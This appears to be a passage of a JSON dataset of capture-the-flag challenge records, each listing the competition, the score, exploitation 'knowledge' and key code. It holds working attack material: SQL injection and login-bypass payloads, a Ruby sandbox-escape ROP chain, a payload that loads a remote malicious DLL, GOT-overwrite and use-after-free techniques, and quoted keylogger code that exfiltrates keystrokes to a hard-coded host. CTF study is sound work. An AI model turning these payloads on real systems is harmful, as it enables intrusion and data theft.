            "When facing a web challenge that involves JavaScript querying a server's endpoint, it's important to inspect the JavaScript code for potential vulnerabilities. Exploiting SQL injection vulnerabilities can be performed by manipulating the input parameters in AJAX requests if the server endpoint does not properly sanitize input. This can lead to unauthorized access to database information. Example Payload: `/query?search=' UNION SELECT 1, 2 --`",
            "Identifying the DBMS version is crucial for tailoring SQL injection attacks. Specific DBMS versions have particular vulnerabilities or support certain syntax that can be exploited. Once the DBMS version is known (e.g., MySQL 5.7.29), targeted SQL injection queries can be crafted to extract valuable data, including database schemas, table names, and sensitive data. Example Payload: `amazonis_planitia UNION SELECT @@version, 1`"
        ],
        "key": "```javascript  \nfunction get_life(query) {  \n //jquery ajax for querying server  \n /*  \n response = $.load('/query?search=' + query, function(responseTxt, statusTxt,\nxhr).parseJSON(response);  \n   {  \n   if (statusTxt == \"success\") {\n\n   }  \n });\n\n*/  \n //alert(query);  \n $.ajax({  \n   type: \"GET\",  \n   url: \"/query?search=\" + query,  \n   data: \"{}\",  \n   contentType: \"application/json; charset=utf-8\",  \n   dataType: \"json\",  \n   cache: false,  \n   success: function(data) {  \n     var table_html =  \n       '<table id=\"results\"><tr><th>Name</th><th>Description</th></tr>';  \n     $.each(data, function(i, item) {  \n       table_html +=  \n         \"<tr><td>\" + data[i][0] + \"</td><td>\" + data[i][1] + \"</td></tr>\";  \n     });  \n     table_html += \"</table>\";\n\n     $(\"#results\").replaceWith(table_html);  \n   },\n\n   error: function(msg) {  \n     //alert(msg.responseText);  \n   }  \n });  \n}  \n```"
    },
    {
        "name": "Light N' Easy",
        "write_up": "dataset/raw/Light N' Easy.md",
        "type": "crypto",
        "competition": [
            "HackCon/2018",
            "https://ctftime.org/event/652/tasks/"
        ],
        "score": 50,
        "max_score": 200,
        "difficulty": 0.25,
        "knowledge": [
            "In challenges involving encoding or encrypting messages with hardware interfaces, such as 7-segment displays, binary digits can represent the state (on/off) of each segment. Understanding how these displays map to alphanumeric characters is critical for decoding messages. A common pattern is using a binary sequence to indicate the segments that should be lit to form each letter or number. Mapping these sequences correctly can reveal hidden messages or keys contained within binary data or hardware signals.",
            "For tasks requiring the interpretation of binary input as visual output, creating a software representation of the hardware component (like a 7-segment display) can be beneficial. This involves programming the logic that translates binary inputs into a readable format, considering the hardware's segmentation and how each segment corresponds to the display's part. Implementing a \"pretty print\" function that visually simulates the hardware's display in text or graphic format on a computer can be useful for debugging or solving challenges that involve complex patterns or encoded messages.\n\nExample pseudo-code for interpreting a 7-segment display binary input:\n```\nsegments = {\n    '0': '0111111',\n    '1': '0000110',\n    '2': '1011011',\n    '3': '1001111',\n    ... \n    ' ': '0000000'  # Represents an unlit display.\n}\n\ndef decode_binary_to_segments(binary_input):\n    binary_sequences = binary_input.split('-')  # Assuming '-' is used as a separator for binary inputs\n    decoded_characters = ''\n    for sequence in binary_sequences:\n        for char, binary in segments.items():\n            if sequence == binary:\n                decoded_characters += char  # Find which character the binary sequence represents\n                break\n    return decoded_characters\n\n# Display the output in a visually meaningful way, such as converting it to an ASCII art representation of the segments.\n```"
        ],
        "key": "```python\ndef display_7_segment(input_string):\n    segments = {\n        '0': '1111110',\n        '1': '0110000',\n        '2': '1101101',\n        '3': '1111001',\n        '4': '0110011',\n        '5': '1011011',\n        '6': '1011111',\n        '7': '1110000',\n        '8': '1111111',\n        '9': '1111011',\n        'A': '1110111',\n        'B': '0011111',\n        'C': '1001110',\n        'D': '0111101',\n        'E': '1001111',\n        'F': '1000111'\n    }\n    \n    for char in input_string:\n        if char in segments:\n            print(segments[char])\n        else:\n            print('0000000')\n\n# Example usage\ndisplay_7_segment(\"0123456789ABCDEF\")\n```\n"
    },
    {
        "name": "Lil Chompy",
        "write_up": "dataset/raw/Lil Chompy.md",
        "type": "reverse",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": 700,
        "max_score": 700,
        "difficulty": 1.0,
        "knowledge": [
            "In heap exploitation challenges involving a custom heap implementation or complex allocation/deallocation logic, identifying and exploiting Use After Free (UAF) vulnerabilities can be crucial. After freeing a heap object, if the program continues to use the pointer to that object, an attacker can manipulate the heap to control the data at the freed location, leading to leaks or arbitrary code execution. When facing a UAF scenario, it's essential to carefully plan the heap layout and operations to turn the vulnerability into a powerful primitive for further exploitation. This often involves renaming or reallocating objects to control the data at the target location.\n   \n   **Example payload approach:** \n   - Create an object to occupy a desired location in the heap.\n   - Free the object but retain its pointer (UAF condition).\n   - Perform operations (e.g., add, rename) to control or leak data at the freed object's location.",
            "When exploiting heap-based vulnerabilities to achieve remote code execution (RCE), finding a way to leak addresses of critical sections like the libc base address, heap, stack, or even the binary itself is crucial to bypass ASLR. This can be achieved by manipulating the heap layout to leak these addresses through controlled format strings or UAF vulnerabilities. Once a leak is obtained, it can be used to calculate the base addresses of these segments, allowing for precise targeting of gadgets or functions like `system()` for RCE. This typically involves chaining multiple steps: leaking a heap pointer, using this to leak a libc address, and then calculating the base addresses required for the final payload.\n\n   **Example leak exploitation:** \n   - Use UAF to overwrite a heap pointer with a known libc address or GOT entry.\n   - Trigger an operation that prints or uses the corrupted pointer to leak the address.\n   - Calculate the base address of libc (or other targeted segments) using the leaked address and known offsets."
        ],
        "key": "```c\ntypedef struct Attraction {  \n\tFunKind kind;  \n\tchar* name;  \n} Attraction;  \n\nvoid rename_attraction(int lot, char* new_name) {\n    if (attractions[lot].name != NULL) {\n        free(attractions[lot].name);\n    }\n    if (new_name[0] == '\\0') {\n        return;\n    }\n    attractions[lot].name = malloc(strlen(new_name) + 1);\n    strcpy(attractions[lot].name, new_name);\n}\n```"
    },
    {
        "name": "LINDA",
        "write_up": "dataset/raw/LINDA.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 169,
        "max_score": 477,
        "difficulty": 0.35429769392033544,
        "knowledge": [
            "For cryptographic challenges focusing on public key encryption, if the public key parameter \\( p - 1 \\) is smooth (meaning it's factored entirely into small primes), one can factor \\( p - 1 \\) using trial division and Lenstra elliptic-curve factorization (ECM). This factorization allows the application of the Pohlig-Hellman algorithm to compute discrete logarithms efficiently, offering a pathway to decrypt the message.",
            "In scenarios where encryption relies on parameters \\( u, v, w \\) as part of the public key and messages are encrypted as \\( ca, cb, cc \\) with given relations under modulus \\( p \\), one can exploit the computed discrete logarithms \\( r, s \\) of \\( ca, cb \\) (with bases \\( u, v \\) respectively) to directly decrypt the encrypted message \\( cc \\) by inversing the exponentiation operation. Specifically, if \\( ca \\equiv u^r \\mod p \\) and \\( cb \\equiv v^s \\mod p \\), then the message \\( m \\) can be obtained by computing \\( m \\equiv ccw^{-(r + s)} \\mod p \\).\n\nExample payload for decryption using Sage:\n```python\nfrom minipwn import remote \nfrom Crypto.Util.number import long_to_bytes\n\nrem = remote(\"07.cr.yp.toc.tf\", 31010)\nfor _ in range(10):  \n   rem.recvline()  \nrem.sendline('e')  \np = int(rem.recvline().strip()[4:])  \nu = int(rem.recvline().strip()[4:])  \nv = int(rem.recvline().strip()[4:])  \nw = int(rem.recvline().strip()[4:])  \nrem.recvlines(5)  \nrem.sendline('s')  \nca, cb, cc = map(int, rem.recvuntil(\")\").strip()[7:-2].split(b', '))  \nr = discrete_log(Mod(ca, p), Mod(u, p))  \ns = discrete_log(Mod(cb, p), Mod(v, p))  \nm = cc * power_mod(w, -(r + s), p) % p  \nprint(long_to_bytes(m).decode())  \n```"
        ],
        "key": "```python  \n#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *  \nfrom math import gcd  \nfrom flag import flag\n\ndef keygen(p):  \n   while True:  \n       u = getRandomRange(1, p)  \n       if pow(u, (p-1) // 2, p) != 1:  \n           break  \n   x = getRandomRange(1, p)  \n   w = pow(u, x, p)  \n   while True:  \n       r = getRandomRange(1, p-1)  \n       if gcd(r, p-1) == 1:  \n           y = x * inverse(r, p-1) % (p-1)  \n           v = pow(u, r, p)  \n           return u, v, w  \n  \ndef encrypt(m, pubkey):  \n   p, u, v, w = pubkey  \n   assert m < p  \n   r, s = [getRandomRange(1, p) for _ in '01']  \n   ca = pow(u, r, p)  \n   cb = pow(v, s, p)  \n   cc = m * pow(w, r + s, p) % p  \n   enc = (ca, cb, cc)  \n   return enc\n```"
    },
    {
        "name": "listcomp ppm",
        "write_up": "dataset/raw/listcomp ppm.md",
        "type": "This is a misc challenge.",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 371,
        "max_score": 1000,
        "difficulty": 0.371,
        "knowledge": [
            "When dealing with challenges requiring the application of list comprehension in Python to solve computational problems under strict character limits, optimizing code by directly integrating the computation within the list comprehension structure is effective. This approach minimizes the overall character count by eliminating the need for separate loops or conditional statements outside of the list comprehension. For example, computing the sum of pairs of integers from input can be compacted into a single line using map and sum functions inside a list comprehension:\n    ```python\n    [print(sum(map(int, input().split()))) for _ in range(int(input()))]\n    ```",
            "In optimization problems such as the knapsack problem, where a limited resource (e.g., budget) is to be allocated across different items (e.g., junk foods) to maximize a certain value (e.g., satisfaction), employing dynamic programming within list comprehensions can significantly reduce code verbosity while maintaining logic clarity. This method involves generating and updating a list (or lists) to keep track of the maximum value attainable at each step considering the current constraints (cost and value of items). The challenge demonstrates this principle by compacting the dynamic programming solution for the knapsack problem into a dense yet efficient list comprehension:\n    ```python\n    [[d.insert(0,[max(s,t+v)for s,t in zip(d[0],[-v]*c+d[0])])for(v,c)in[r()for _ in[1]*N]]==print(max(d[0][:M+1])) for r in lambda:map(int, input().split()) for (N, M), d in [(r(), [[0]*3001])]]\n    ```"
        ],
        "key": "```python\n# Q2 normal code  \nr = lambda: map(int,input().split())  \nN, M = r()  \nd = [[0]*3001]  \npairs = [r() for _ in [1]*N]  \nfor v, c in pairs:  \n   new = []  \n   for s in range(M+1):  \n       if s >= c:  \n           new.append( max(d[-1][s],d[-1][s-c]+v) )  \n       else:  \n           new.append( d[-1][s] )  \n   d.append(new)  \nprint(max(d[-1])\n```"
    },
    {
        "name": "little riddle",
        "write_up": "dataset/raw/little riddle.md",
        "type": "pwn",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "In scenarios where a Ruby application is sandboxed with `$SAFE=3`, a bypass can be achieved by leveraging `Fiddle::Pointer` due to its lack of taint checking, allowing for arbitrary memory read and write operations. This method can be applied universally in similar sandboxed environments where direct memory manipulation is restricted but Fiddle is accessible. A detailed exploitation process involves determining libc offsets, using `Fiddle::Pointer` for memory operations to calculate libc base address, and crafting a payload for arbitrary code execution.\n   - Example payload setup:\n     ```ruby\n     libc_base = main_arena - libc_offset[\"main_arena\"]\n     payload << [libc_base + libc_offset[\"pop_rdi_ret\"], ptr.to_i].pack(\"Q*\")\n     ```",
            "For challenges involving WebAssembly, exploiting an off-by-one buffer overflow in conjunction with the characteristics of Emscripten's dlmalloc implementation and WebAssembly's lack of readonly memory can lead to arbitrary code execution. Specifically, by making chunks overlap, manipulating WebAssembly module\u2019s memory to modify function pointers or string constants, an attacker can run arbitrary JavaScript code. This approach is particularly effective in WebAssembly compiled applications where direct memory management functions (like dlmalloc) are used and the application logic allows for overflow vulnerabilities.\n   - Example steps for exploitation:\n     1. Exploit off-by-one buffer overflow to create overlapping chunks.\n     2. Overwrite an existing letter's `filter` function pointer to point to a controllable function (`__stdio_read` in this case).\n     3. Use the overridden function to modify application memory, such as changing a string constant to inject and execute JavaScript code.\n     4. Trigger the execution of the modified constant/function pointer to run arbitrary code."
        ],
        "key": "```ruby\n# allocate a chunk  \na = Fiddle::Pointer.malloc(1)  \nputs \"a = 0x%x\" % a.to_i\n\n# get its arena  \narena = Fiddle::Pointer.new(a.to_i & 0xfffffffffc000000)[0, 8].unpack(\"Q\")[0]  \nputs \"arena = 0x%x\" % arena\n\n# get address of main_arena  \nmain_arena = Fiddle::Pointer.new(arena + 0x868)[0, 8].unpack(\"Q\")[0]  \nputs \"main_arena = 0x%x\" % main_arena.to_i\n\n# get libc base  \nlibc_base = main_arena - libc_offset[\"main_arena\"]  \nputs \"libc base = 0x%x\" % libc_base\n\n# read flag  \n[1].each{  \n ptr = Fiddle::Pointer.malloc(0x200, libc_base + libc_offset[\"setcontext\"])\n\n payload = \"\"  \n payload << \"/home/p31338/flag\".ljust(0xa0, \"\\0\")  \n payload << [ptr.to_i + 0xb0].pack(\"Q*\")  # rsp  \n payload << [libc_base + libc_offset[\"ret\"]].pack(\"Q\") * 10  \n payload << [libc_base + libc_offset[\"pop_rdi_ret\"], ptr.to_i].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"pop_rsi_ret\"], 0].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"open\"]].pack(\"Q\")  \n payload << [libc_base + libc_offset[\"pop_rdi_ret\"], 7].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"pop_rsi_ret\"], ptr.to_i].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"pop_rdx_ret\"], 0x40].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"read\"]].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"pop_rdi_ret\"], 1].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"pop_rsi_ret\"], ptr.to_i].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"pop_rdx_ret\"], 0x40].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"write\"]].pack(\"Q*\")  \n payload << [libc_base + libc_offset[\"exit\"]].pack(\"Q\")  \n ptr[0, payload.length] = payload  \n}  \nGC.start  \n```"
    },
    {
        "name": "LIVE MATH LOVE",
        "write_up": "dataset/raw/LIVE MATH LOVE.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2022",
            "https://ctftime.org/event/1557/tasks/"
        ],
        "score": 184,
        "max_score": 500,
        "difficulty": 0.368,
        "knowledge": [
            "In challenges involving binary exploitation with floating point inputs, we can leverage the fact that specific floating point representations can correspond to memory addresses or control flow altering values when improperly handled. By crafting a floating point value that is carefully chosen to represent the memory address of a desired function (e.g., a function that spawns a shell), control of the program's execution can be obtained. This technique is effective in scenarios where the binary reads floating point numbers and uses them in a manner that impacts control flow or function pointers.\n\n   - Example Payload: `5.883707532277683e-39` corresponds to the floating point representation that, due to the binary's improper handling, leads to the execution of a designated function (such as a shell spawning function).",
            "When preparing an exploit for a binary that relies on specific input formats (e.g., floating point numbers), Python's struct module can be pivotal. It allows for the packing and unpacking of structured data into bytes, suitable for directly interacting with binary programs that expect complex input types. This method is crucial when an exploit needs to send bytes that represent floating point numbers, addresses, or other structured data to a vulnerable program.\n\n   - Example Code Snippet: `struct.unpack('!f', '\\x00\\x40\\x11\\x62')[0]` converts a sequence of bytes into its floating point representation that can be sent as input to the binary."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>\n\nvoid win()  {  \n   system(\"/bin/sh\");  \n}\n\nvoid add() {  \n   float a;  \n   float b;  \n   scanf(\"%f\\n\", &a);  \n   scanf(\"%f\\n\", &b);\n\n   printf(\"%f\\n\", a+b);  \n}\n\nvoid sub() {  \n   float a;  \n   float b;  \n   scanf(\"%f\\n\", &a);  \n   scanf(\"%f\\n\", &b);\n\n   printf(\"%f\\n\", a-b);  \n}\n\nvoid mult() {  \n   float a;  \n   float b;  \n   scanf(\"%f\\n\", &a);  \n   scanf(\"%f\\n\", &b);\n\n   printf(\"%f\\n\",a*b);  \n}\n\nvoid menu() {  \n   printf(\"LIVE MATH LOVE\\n\");  \n   printf(\"1. Add\\n\");  \n   printf(\"2. Subtract\\n\");  \n   printf(\"3. Multiply\\n\");  \n   printf(\"> \");\n\n   void (*action)();  \n   int choice;  \n   scanf(\"%d\\n\", &choice);\n\n   if (choice == 1) {  \n       action = add;  \n   } else if (choice == 2) {  \n       action = sub;  \n   } else if (choice == 3) {  \n       action = mult;  \n   }\n\n   action();\n\n   menu();  \n}\n\nvoid main() {  \n   setvbuf(stdout, NULL, _IONBF, 0);  \n   setvbuf(stdin, NULL, _IONBF, 0);  \n   setvbuf(stderr, NULL, _IONBF, 0);\n\n   menu();\n\n}  \n```"
    },
    {
        "name": "LLLattice",
        "write_up": "dataset/raw/LLLattice.md",
        "type": "reverse",
        "competition": [
            "pbctf/2023",
            "https://ctftime.org/event/1763/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When reverse engineering FPGA bitstreams, especially for Lattice FPGAs, identifying the specific FPGA model from the bitstream's header can provide crucial context for the decompilation process. This knowledge allows for a more targeted approach in extracting and simulating the design's functionality. Knowing the exact FPGA model (e.g., `LFE5U-25F-6CABGA381`) can be instrumental in selecting the appropriate tools and techniques for decompilation and analysis.",
            "In scenarios involving reverse engineering of hardware designs (e.g., FPGA bitstreams), utilizing a combination of decompiler tools, simulation software, and schematic analysis can be highly effective. Specifically, for Lattice FPGA bitstreams, utilizing VoidMercy's Lattice ECP5 Bitstream Decompiler for extracting Verilog code, followed by RTL simplification with yosys, and conducting simulation and schematic analysis with tools like Vivado, facilitates a comprehensive understanding of the design. This approach is particularly useful when facing complex hardware reversing challenges, aiding in the identification of key components such as IO ports, clock inputs, and functional blocks within the design."
        ],
        "key": "```verilog\nforce top_wrap.top.\\R4C37_PLC2_inst.sliceA_inst.ff_1.Q = 0;  \nforce top_wrap.top.\\R3C37_PLC2_inst.sliceC_inst.ff_0.Q = 1; \nforce top_wrap.top.\\R3C37_PLC2_inst.sliceD_inst.genblk9.lut4_0.D = 1; \nforce top_wrap.top.\\R3C38_PLC2_inst.sliceA_inst.genblk9.lut4_0.D = 1;  \nforce top_wrap.top.\\R3C37_PLC2_inst.sliceD_inst.genblk9.lut4_0.D = 1;  \nforce top_wrap.top.\\R2C39_PLC2_inst.sliceD_inst.ff_0.CE = 1;\n\nrst = 1;  \n```"
    },
    {
        "name": "LoadMe",
        "write_up": "dataset/raw/LoadMe.md",
        "type": "misc",
        "competition": [
            "insomnihack/2022/Quals",
            "https://ctftime.org/event/1505/tasks/"
        ],
        "score": 243,
        "max_score": 451,
        "difficulty": 0.5388026607538803,
        "knowledge": [
            "In a pwn challenge involving exploitation of Windows systems without a provided binary, identifying input handling vulnerabilities can lead to arbitrary code execution. Specifically, overrunning input buffers with more than 64 characters may trigger errors that suggest the application is attempting to load a Dynamic Link Library (DLL) using that input. This behavior can be exploited by crafting inputs that make the application load a malicious DLL hosted on a network share, achieving Remote Code Execution (RCE). A payload example for triggering the DLL loading mechanism is a long series of commas followed by a UNC path to a malicious DLL, e.g., `,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\\\live.sysinternals.com\\tools\\yourdll.dll`.",
            "If Internet Service Providers (ISPs) or hosting providers block SMB ports (139 and 445) which are commonly used for network shares, consider using WebDAV as an alternative for hosting a malicious DLL. Windows attempts to resolve UNC paths can fall back to using WebDAV, which allows specifying a custom port in the UNC path, thus bypassing the port block. Additionally, setting up a WebDAV share on a server and directing the vulnerable application to load a DLL from this location can circumvent common network restrictions. An example payload that leverages WebDAV for DLL loading is: `,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\\\1.2.3.4@8080\\data\\malicious.dll`."
        ],
        "key": "```c\n#include <windows.h>\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)  \n{  \n   system(\"dir\");  \n   ExitProcess(1);  \n}  \n```"
    },
    {
        "name": "Log 'em All",
        "write_up": "dataset/raw/Log 'em All.md",
        "type": "reverse",
        "competition": [
            "BSidesSF/2021",
            "https://ctftime.org/event/1299/tasks/"
        ],
        "score": 967,
        "max_score": 967,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge involving a game or application where objects are dynamically allocated and freed, a `use-after-free` vulnerability can appear when an object's memory is freed but references to that object are still used within the program. This can often be exploited by interacting with the game or application in a way that causes a new object to be allocated at the memory location of the freed object, allowing an attacker to control the data of the newly allocated object. In the given context, this was exploited by defeating an Asciimon, choosing to replace the current Asciimon with the defeated one, and then engaging in another fight with the same Asciimon, which had been freed but was still referenced, leading to a use-after-free condition.",
            "For exploiting a `use-after-free` vulnerability effectively, especially in scenarios where the memory layout and object sizes are predictable (e.g., objects are consistently `0x40` bytes in size), it is possible to control the overwritten data by causing an object of the same size to be allocated in the freed object's memory space. By renaming a character or object (in this case, through the official Name Rater) after triggering the vulnerability, an attacker can overwrite critical function pointers or data structures with controlled values. The attacker needs to ensure that the new data (e.g., the new name) is of a specific length or format to exploit the application correctly. This technique allows for arbitrary code execution or manipulation of the application's state in a beneficial manner to the attacker."
        ],
        "key": "```c++\nvoid DoFight_00402c3c(Encounters *encounters,PlayerInfo *playerInfo,AsciimonIndex *index,  \n                    int someBool)\n\n{  \n  // ... (other code) ...\n  \n  printf(\"Would you to replace your %s? [y/N]\\n\\n\",own->name_0x4);  \n  fgets(local_60,8,stdin);  \n  if (local_60[0] == 'y') {  \n    playerInfo->asciimon = enemy;  \n    enemy->isUsedByPlaner_0x34 = 1;  \n    free(own);  \n  }  \n}\n```"
    },
    {
        "name": "log log log",
        "write_up": "dataset/raw/log log log.md",
        "type": "crypto",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 110,
        "max_score": 250,
        "difficulty": 0.44,
        "knowledge": [
            "When dealing with a Discrete Logarithm Problem (DLP) where the target is to find 'e' and only the least significant bits of 'e' are required for obtaining the flag, and it is known that 'e' is reduced modulo a power of 2 (in this case, \\(2^{1024}\\)), applying the Pohlig-Hellman algorithm specifically for the prime power factor (here, \\(2^{1024}\\)) can be an efficient approach due to its feasibility in computation. This approach significantly reduces complexity and is particularly useful when 'e' modulo a power of 2 is sufficient for recovering the flag.",
            "In scenarios where the modulus 'p' in a cryptographic challenge is designed as a large prime number satisfying a relation like \\(p = q \\cdot 2^{n} + 1\\) (where 'q' and 'n' are known), and the order of the group is \\(p - 1\\) which includes a large prime \\(q\\) and a high power of 2, focusing on the factor of \\(2^{n}\\) (if relevant to the challenge's goal) simplifies the problem. This simplification is especially relevant if the challenge involves solving for a value 'e' where only a certain number of least significant bits are needed. This strategy leverages the knowledge of the factorization of \\(p - 1\\) to efficiently solve for portions of 'e', making it practical to handle otherwise intractable problems."
        ],
        "key": "```python\nq = 127049168626532606399765615739991416718436721363030018955400489736067198869364016429387992001701094584958296787947271511542470576257229386752951962268029916809492721741399393261711747273503204896435780180020997260870445775304515469411553711610157730254858210474308834307348659449375607755507371266459204680043  \np = q * 2^1024 + 1\n\nassert p in Primes()\n\nnbits = p.nbits()-1\n\ne = randbits(nbits-flagbits)  \ne <<= flagbits  \ne |= flag\n\nK = GF(p)  \ng = K.multiplicative_generator()  \na = g^e\n\nprint(hex(p))  \nprint(g)  \nprint(hex(a))  \nprint(flagbits)  \n```"
    },
    {
        "name": "log-me-in",
        "write_up": "dataset/raw/log-me-in.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 87,
        "max_score": 474,
        "difficulty": 0.18354430379746836,
        "knowledge": [
            "In challenges where SQL injection is mitigated through prepared statements but the application accepts complex data types (like arrays or objects) due to the use of bodyParser with `extended: true` in Express.js applications, manipulating the input format to pass an object where a string is expected can lead to unexpected and exploitable query behavior. This technique exploits the way MySQL handles type casting and comparison, enabling bypass of authentication mechanisms when the password check is implemented insecurely.  \nExample payload: `csrf&username=michelle&password[username]=michelle`",
            "When exploiting web applications that employ session cookies for state management, after successfully injecting or bypassing authentication mechanisms, the session cookies can be used to maintain access or escalate privileges within the application. Tools like curl or scripting languages such as Python with libraries like `requests` can be used to automate the extraction of sensitive information (like a flag) from authenticated sessions.  \nExample command: `curl -i -X POST --data 'csrf&username=michelle&password[username]=michelle' \"https://log-me-in.web.ctfcompetition.com/login\"`  \nExample Python snippet:\n```python\nimport requests  \nurl = 'https://log-me-in.web.ctfcompetition.com/login'\npayload = {\n   \"username\": \"michelle\",  \n   \"password[username]\": \"michelle\",  \n   \"csrf\": \"\",  \n}\ns = requests.Session()\ns.post(url, data=payload)\nresponse = s.get('https://log-me-in.web.ctfcompetition.com/flag')\nprint(response.text)\n```"
        ],
        "key": "```js\napp.post('/login', (req, res) => {  \n const u = req.body['username'];  \n const p = req.body['password'];\n\n const con = DBCon(); // mysql.createConnection(...).connect()\n\n const sql = 'Select * from users where username = ? and password = ?';  \n con.query(sql, [u, p], function(err, qResult) {  \n   if(err) {  \n     res.render('login', {error: `Unknown error: ${err}`});  \n   } else if(qResult.length) {  \n     const username = qResult[0]['username'];  \n     let flag;  \n     if(username.toLowerCase() == targetUser) {  \n       flag = flagValue  \n     } else{  \n       flag = \"<span>Only Michelle's account has the flag</span>\";  \n     }  \n     req.session.username = username  \n     req.session.flag = flag  \n     res.redirect('/me');  \n   } else {  \n     res.render('login', {error: \"Invalid username or password\"})  \n   }  \n });  \n});\n```"
    },
    {
        "name": "logbook",
        "write_up": "dataset/raw/logbook.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2023/Quals",
            "https://ctftime.org/event/1942/tasks/"
        ],
        "score": 200,
        "max_score": 1000,
        "difficulty": 0.2,
        "knowledge": [
            "In a challenge involving a binary with format string vulnerabilities, if the binary has partial RELRO (Relocation Read-Only) protection, it is possible to perform a GOT (Global Offset Table) overwrite attack to redirect the execution flow. To successfully exploit the format string vulnerability, one can use tools like pwntools to automate the exploitation process, including crafting payloads that modify the GOT entries.\n   \n    - Condition: Applicable when exploiting format string vulnerabilities in binaries with partial RELRO protection.\n    - Knowledge: Utilize pwntools' `fmtstr_payload` function to generate a payload that overwrites a specific GOT entry with the desired function address to hijack the execution flow.\n    - Example payload creation: `payload = fmtstr_payload(offset, {elf.got.strncmp: elf.symbols['print_flag']})`",
            "When choosing a function in the GOT to overwrite during a format string exploit in a binary, consider the function's invocation timing and any potential obstacles like terminating bytes that could impact payload delivery (e.g., space character treated as input termination by `scanf`).\n   \n    - Condition: Effective when planning a GOT overwrite attack where direct interaction with input functions, such as `scanf`, limits the payload.\n    - Knowledge: Select a function's GOT entry for overwriting based on the absence of problematic bytes within its address and ensure the function's call occurs post-exploitation without previous invocations to prevent disruptions in program execution.\n    - Example strategy: Choosing `strncmp`'s GOT entry for overwrite instead of `putchar` to avoid the space character issue in address and ensure function gets called after exploit without prior calls disrupting program flow."
        ],
        "key": "```c\nprintf(local_78);\n```"
    },
    {
        "name": "Logger",
        "write_up": "dataset/raw/Logger.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing `.pcap` files in cybersecurity investigations or CTF challenges, especially when dealing with network traffic data, it is crucial to examine HTTP packets for sensitive information such as login credentials (e.g., `POST` requests to login endpoints). Additionally, exploring JavaScript files fetched by the client can reveal custom hashing mechanisms or other client-side security measures. Using Wireshark or similar tools is essential for these activities.",
            "In scenarios involving custom encoding or encryption mechanisms (e.g., WebSocket communication in CTF challenges), reverse engineering the encoding or encryption logic is pivotal. Often, these custom mechanisms can be brute-forced or reversed given enough understanding of the algorithm\u2019s structure and output. For the given challenge, the attacker's keylogger encoded keystrokes before transmission over WebSockets; knowing the encoding method and keys allowed for decoding the intercepted data to retrieve the user's input. Implementing reverse engineering on JavaScript can be approached by analyzing and replicating the function logic, as demonstrated with the `encode` function and the paired `decode` process.\n\nExample of a decoding function basing on observed characteristics of the encoding algorithm:\n```javascript\nfunction decode(encoded_str, key) {\n    let decoded_arr = encoded_str.split(\"\").map(x => key.indexOf(x)).reverse();\n    let result = \"\";\n    // Assuming `helper` is a function to decode characters based on `decode` logic\n    decoded_arr.forEach(encoded_char => {\n        result += helper(encoded_char, key);\n    });\n    return result;\n}\n```\n\nThis function is a simplified conceptual approach and needs the actual decoding logic (`helper` function) to reverse the encoding process accurately."
        ],
        "key": "```js\nwindow.addEventListener(\"DOMContentLoaded\", function() {\n\n function encode(msg, key) {  \n   var encoded_arr = [];  \n   if (typeof s === \"string\") msg = (new TextEncoder(\"utf-8\")).encode(msg);  \n   var i=0, z;  \n   for (;i < msg.length;i++) if(msg[i]) break;  \n   z = i;  \n   for (;i < msg.length;i++) {  \n     var c = msg[i], j = 0;  \n     for (;j in encoded_arr || c;j++) {  \n       if (encoded_arr[j]) c += encoded_arr[j] * 256;  \n       encoded_arr[j] = c % 58;  \n       c = Math.floor(c / 58);  \n     }  \n   }  \n   return key[0].repeat(z) + encoded_arr.reverse().map(x => key[x]).join(\"\");  \n }\n\n function hash(s) {  \n   var r = 0, i=0;  \n   for (;i < s.length;i++) r = r * 31 + s.charCodeAt(i) | 0;  \n   return r;  \n }\n\n function rand(s) {  \n   var x = 123456789, y=362436069, z=521288629, w = 88675123, t;  \n   return function(a, b) {  \n     t = x ^ x << 11;  \n     x = y; y = z; z = w;  \n     w = w ^ w >> 19 ^ (t ^ t >> 8);  \n     if (a !== undefined && b !== undefined) {  \n       return a + w % (b + 1 - a);  \n     }  \n     return w;  \n   };  \n }\n\n function shuffle(a, r) {  \n   var i;  \n   i = a.length - 1;  \n   for (;i > 0;i--) {  \n     var j = Math.abs(r(0, i));  \n     var t = a[i]; a[i] = a[j]; a[j] = t;  \n   }  \n }\n\n var ws = new WebSocket(\"ws://192.168.99.101:7467\");  \n var key = \"MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp\";  \n var key2 = key;\n\n ws.addEventListener(\"open\", function(event) {  \n   var message = navigator.userAgent;  \n   